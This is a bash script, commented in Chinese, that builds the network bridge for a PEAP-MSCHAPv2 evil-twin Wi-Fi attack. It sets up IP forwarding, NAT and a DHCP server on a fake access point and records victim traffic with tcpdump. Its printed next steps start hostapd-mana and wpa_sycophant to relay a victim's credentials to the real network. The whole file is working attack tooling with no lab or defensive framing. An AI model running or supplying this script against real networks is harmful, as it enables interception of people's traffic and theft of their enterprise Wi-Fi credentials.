#!/bin/bash

# MitM Bridge Setup Script
# 用于在伪造AP和真实网络之间建立桥接

set -e

REAL_IFACE="${1:-wlan0}"  # 连接真实AP的接口
FAKE_IFACE="${2:-wlan1}"  # 伪造AP接口

echo "╔═══════════════════════════════════════════════════════════╗"
echo "║      PEAP-MSCHAPv2 MitM Bridge Configuration            ║"
echo "╚═══════════════════════════════════════════════════════════╝"
echo ""
echo "[+] Network Architecture:"
echo "    Victim → $FAKE_IFACE (fake AP) → NAT → $REAL_IFACE (real network) → Internet"
echo ""

# 检查是否以root运行
if [[ $EUID -ne 0 ]]; then
    echo "[!] This script must be run as root"
    exit 1
fi

# 检查接口是否存在
if ! ip link show "$REAL_IFACE" > /dev/null 2>&1; then
    echo "[!] Error: Interface $REAL_IFACE does not exist"
    exit 1
fi

if ! ip link show "$FAKE_IFACE" > /dev/null 2>&1; then
    echo "[!] Error: Interface $FAKE_IFACE does not exist"
    exit 1
fi

# 注意: wlan0在攻击开始时可能没有IP，因为需要等待受害者先连接
# 然后wpa_sycophant才会使用受害者的凭据连接真实AP

# 启用IP转发
echo "[+] Enabling IP forwarding..."
sysctl -w net.ipv4.ip_forward=1 > /dev/null
sysctl -w net.ipv6.conf.all.forwarding=1 > /dev/null

# 清除现有规则
echo "[+] Clearing existing iptables rules..."
iptables -F
iptables -t nat -F
iptables -t mangle -F
iptables -X 2>/dev/null || true

# 设置默认策略
iptables -P FORWARD ACCEPT

# NAT设置
echo "[+] Setting up NAT..."
iptables -t nat -A POSTROUTING -o "$REAL_IFACE" -j MASQUERADE

# 转发规则
echo "[+] Setting up forwarding rules..."
iptables -A FORWARD -i "$FAKE_IFACE" -o "$REAL_IFACE" -j ACCEPT
iptables -A FORWARD -i "$REAL_IFACE" -o "$FAKE_IFACE" -m state --state RELATED,ESTABLISHED -j ACCEPT

# 确保fake AP接口是UP状态
echo "[+] Bringing up $FAKE_IFACE interface..."
ip link set "$FAKE_IFACE" up

# 配置fake AP接口IP
echo "[+] Configuring $FAKE_IFACE IP address (192.168.100.1/24)..."
# 先删除可能存在的旧IP
ip addr flush dev "$FAKE_IFACE" 2>/dev/null || true
# 添加新IP
ip addr add 192.168.100.1/24 dev "$FAKE_IFACE" 2>/dev/null || true

# 验证IP配置
if ip addr show "$FAKE_IFACE" | grep -q "192.168.100.1"; then
    echo "[+] IP address configured successfully"
else
    echo "[!] Warning: Failed to configure IP address on $FAKE_IFACE"
fi

# 配置firewalld（如果启用）
if systemctl is-active --quiet firewalld 2>/dev/null; then
    echo "[+] Configuring firewalld rules..."
    
    # 将wlan1添加到trusted zone（最简单的方法）
    firewall-cmd --zone=trusted --add-interface="$FAKE_IFACE" --permanent 2>/dev/null || true
    firewall-cmd --zone=trusted --add-interface="$FAKE_IFACE" 2>/dev/null || true
    
    # 在public zone也开放必要的服务
    firewall-cmd --zone=public --add-service=dhcp --permanent 2>/dev/null || true
    firewall-cmd --zone=public --add-service=dns --permanent 2>/dev/null || true
    firewall-cmd --zone=public --add-service=dhcp 2>/dev/null || true
    firewall-cmd --zone=public --add-service=dns 2>/dev/null || true
    
    # 开放DHCP端口
    firewall-cmd --zone=public --add-port=67/udp --permanent 2>/dev/null || true
    firewall-cmd --zone=public --add-port=68/udp --permanent 2>/dev/null || true
    firewall-cmd --zone=public --add-port=67/udp 2>/dev/null || true
    firewall-cmd --zone=public --add-port=68/udp 2>/dev/null || true
    
    # 允许从wlan1到wlan0的转发
    firewall-cmd --direct --add-rule ipv4 filter FORWARD 0 -i "$FAKE_IFACE" -o "$REAL_IFACE" -j ACCEPT 2>/dev/null || true
    firewall-cmd --direct --add-rule ipv4 filter FORWARD 0 -i "$REAL_IFACE" -o "$FAKE_IFACE" -m state --state RELATED,ESTABLISHED -j ACCEPT 2>/dev/null || true
    
    echo "[+] Firewalld configured"
fi

# 停止可能存在的dnsmasq进程
echo "[+] Stopping any existing dnsmasq instances..."
if [ -f /tmp/dnsmasq_mitm.pid ]; then
    kill "$(cat /tmp/dnsmasq_mitm.pid)" 2>/dev/null || true
    rm -f /tmp/dnsmasq_mitm.pid
fi
pkill -f "dnsmasq.*$FAKE_IFACE" 2>/dev/null || true
sleep 1

# 检查53端口是否被占用
echo "[+] Checking for port conflicts..."
PORT_CONFLICT=$(ss -tulpn | grep ":53 " || true)
if [ -n "$PORT_CONFLICT" ]; then
    echo "[!] Warning: Port 53 is in use by:"
    echo "$PORT_CONFLICT"
    echo "[+] Attempting to stop conflicting services..."
    
    # 尝试停止systemd-resolved（常见冲突源）
    if systemctl is-active --quiet systemd-resolved 2>/dev/null; then
        echo "    Stopping systemd-resolved..."
        systemctl stop systemd-resolved 2>/dev/null || true
        sleep 1
    fi
    
    # 再次检查
    PORT_CONFLICT=$(ss -tulpn | grep ":53 " || true)
    if [ -n "$PORT_CONFLICT" ]; then
        echo "[!] Port 53 still in use. Using port 5353 for DNS instead."
        DNS_PORT=5353
    else
        DNS_PORT=53
    fi
else
    DNS_PORT=53
fi

# 启动DHCP服务器
echo "[+] Starting DHCP server on $FAKE_IFACE..."
echo "    DHCP range: 192.168.100.10 - 192.168.100.100"
echo "    Gateway: 192.168.100.1"
echo "    DNS: 8.8.8.8, 8.8.4.4"
if [ "$DNS_PORT" != "53" ]; then
    echo "    DNS port: $DNS_PORT (port 53 was in use)"
fi

# 清理旧日志文件并创建新的
rm -f /tmp/dnsmasq_mitm.log
touch /tmp/dnsmasq_mitm.log
chmod 666 /tmp/dnsmasq_mitm.log

# 创建DHCP lease文件目录
mkdir -p /tmp/dnsmasq
chmod 777 /tmp/dnsmasq

dnsmasq \
    --interface="$FAKE_IFACE" \
    --bind-dynamic \
    --dhcp-range=192.168.100.10,192.168.100.100,12h \
    --dhcp-option=3,192.168.100.1 \
    --dhcp-option=6,8.8.8.8,8.8.4.4 \
    --dhcp-authoritative \
    --port="$DNS_PORT" \
    --no-resolv \
    --server=8.8.8.8 \
    --server=8.8.4.4 \
    --log-queries \
    --log-dhcp \
    --log-facility=/tmp/dnsmasq_mitm.log \
    --pid-file=/tmp/dnsmasq_mitm.pid \
    --conf-file=/dev/null \
    --no-hosts \
    --dhcp-leasefile=/tmp/dnsmasq/leases \
    --keep-in-foreground &

# 等待dnsmasq启动
sleep 2

# 验证DHCP服务器是否启动成功
if pgrep -f "dnsmasq.*$FAKE_IFACE" > /dev/null; then
    DNSMASQ_PID=$(pgrep -f "dnsmasq.*$FAKE_IFACE")
    echo "[+] DHCP server started successfully (PID: $DNSMASQ_PID)"
    echo "[+] DHCP log: /tmp/dnsmasq_mitm.log"
else
    echo "[!] Error: Failed to start DHCP server"
    echo "[!] Check /tmp/dnsmasq_mitm.log for details"
    if [ -f /tmp/dnsmasq_mitm.log ]; then
        echo "[!] Last log entries:"
        tail -5 /tmp/dnsmasq_mitm.log
    fi
fi

# 流量标记
echo "[+] Setting up traffic marking..."
iptables -t mangle -A PREROUTING -i "$FAKE_IFACE" -p tcp --dport 80 -j MARK --set-mark 1 2>/dev/null || true
iptables -t mangle -A PREROUTING -i "$FAKE_IFACE" -p tcp --dport 443 -j MARK --set-mark 2 2>/dev/null || true

# 启动流量捕获
CAPTURE_FILE="/tmp/victim_traffic_$(date +%Y%m%d_%H%M%S).pcap"
echo "[+] Starting packet capture to: $CAPTURE_FILE"
tcpdump -i "$FAKE_IFACE" -w "$CAPTURE_FILE" 'not arp' > /dev/null 2>&1 &
TCPDUMP_PID=$!
echo "[+] tcpdump started (PID: $TCPDUMP_PID)"
echo ""

# 获取真实接口IP
REAL_IP=$(ip -4 addr show "$REAL_IFACE" | grep inet | awk '{print $2}' | head -1 || echo 'no IP')

echo "╔═══════════════════════════════════════════════════════════╗"
echo "║              Bridge Setup Complete!                      ║"
echo "╚═══════════════════════════════════════════════════════════╝"
echo ""
echo "Configuration Summary:"
echo "  Real AP Interface:    $REAL_IFACE ($REAL_IP)"
echo "  Fake AP Interface:    $FAKE_IFACE (192.168.100.1/24)"
echo "  IP Forwarding:        enabled"
echo "  NAT:                  enabled"
echo "  DHCP Server:          running (192.168.100.10-100)"
echo "  Packet Capture:       $CAPTURE_FILE"
echo ""
echo "Current NAT rules:"
iptables -t nat -L -n -v | head -n 10
echo ""
echo "Next Steps:"
echo "  1. Start hostapd-mana on $FAKE_IFACE if not running"
echo "  2. Start wpa_sycophant to connect real AP on $REAL_IFACE"
echo "  3. Wait for victim to connect to fake AP"
echo ""
echo "Troubleshooting:"
echo "  - Check DHCP log:      tail -f /tmp/dnsmasq_mitm.log"
echo "  - Check interface:     ip addr show $FAKE_IFACE"
echo "  - Test DHCP locally:   sudo dhclient -v $FAKE_IFACE"
echo "  - Monitor connections: watch -n1 'arp -n | grep $FAKE_IFACE'"
echo ""
echo "Press Ctrl+C to stop and cleanup..."
echo ""

# 清理函数
cleanup() {
    echo ""
    echo "[+] Cleaning up..."
    
    # 停止tcpdump
    if [ -n "$TCPDUMP_PID" ] && ps -p "$TCPDUMP_PID" > /dev/null 2>&1; then
        kill "$TCPDUMP_PID" 2>/dev/null || true
        echo "[+] Stopped traffic capture"
    fi
    
    # 停止DHCP服务器
    echo "[+] Stopping DHCP server..."
    pkill -f "dnsmasq.*$FAKE_IFACE" 2>/dev/null || true
    if [ -f /tmp/dnsmasq_mitm.pid ]; then
        kill "$(cat /tmp/dnsmasq_mitm.pid)" 2>/dev/null || true
        rm -f /tmp/dnsmasq_mitm.pid
    fi
    
    # 恢复systemd-resolved（如果之前停止了）
    if ! systemctl is-active --quiet systemd-resolved 2>/dev/null; then
        systemctl start systemd-resolved 2>/dev/null || true
    fi
    
    echo "[+] DHCP server stopped"
    
    # 清理firewalld永久规则
    if systemctl is-active --quiet firewalld 2>/dev/null; then
        echo "[+] Cleaning up firewalld rules..."
        firewall-cmd --zone=trusted --remove-interface="$FAKE_IFACE" --permanent 2>/dev/null || true
        firewall-cmd --zone=public --remove-service=dhcp --permanent 2>/dev/null || true
        firewall-cmd --zone=public --remove-service=dns --permanent 2>/dev/null || true
        firewall-cmd --zone=public --remove-port=67/udp --permanent 2>/dev/null || true
        firewall-cmd --zone=public --remove-port=68/udp --permanent 2>/dev/null || true
        firewall-cmd --reload 2>/dev/null || true
        echo "[+] Firewalld permanent rules removed"
    fi
    
    echo "[+] Capture saved to: $CAPTURE_FILE"
    echo "[+] Cleanup complete"
    exit 0
}

# 注册清理函数
trap cleanup INT TERM EXIT

# 等待中断
while true; do
    sleep 1
done
